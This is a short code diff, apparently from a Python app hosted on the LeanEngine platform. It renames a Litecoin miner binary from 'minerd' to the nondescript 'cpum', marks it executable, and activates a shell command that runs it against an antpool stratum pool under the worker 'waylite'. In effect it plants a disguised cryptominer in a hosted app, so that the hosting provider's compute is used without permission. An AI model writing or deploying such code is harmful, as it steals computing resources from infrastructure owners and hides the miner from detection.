@@ -11,10 +11,10 @@ engine = Engine()
 
 
 #minerd.exe --url (YOUR STRATUM POOL ADDRESS) -a scrypt --userpass (YOUR WORKER USERNAME):(YOUR PASSWORD)
-#str_cmd = 'PATH="$PATH:/home/azhu/test" && echo $PATH && minerd --url=stratum+tcp://stratum-ltc.antpool.com:443 --user=waylite --algo=scrypt --userpass waylite.2:x'
-str_setup = 'chmod 777 minerd'
-str_cmd = 'PATH="$PATH:/home/leanengine/app" && echo $PATH && minerd --url=stratum+tcp://stratum-ltc.antpool.com:443 --user=waylite --algo=scrypt --userpass waylite.1:x'
-str_cmd = 'PATH="$PATH:/home/leanengine/app" && echo $PATH && ls -l'
+#str_cmd = 'PATH="$PATH:/home/azhu/test" && echo $PATH && cpum --url=stratum+tcp://stratum-ltc.antpool.com:443 --user=waylite --algo=scrypt --userpass waylite.1:x'
+str_setup = 'chmod +x cpum'
+str_cmd = 'PATH="$PATH:/home/leanengine/app" && echo $PATH && cpum --url=stratum+tcp://stratum-ltc.antpool.com:443 --user=waylite --algo=scrypt --userpass waylite.1:x'
+#str_cmd = 'PATH="$PATH:/home/leanengine/app" && echo $PATH && ls -l'
 ENGNIE_RESTARTED = True
 
 def OutputShell( str_cmd ):
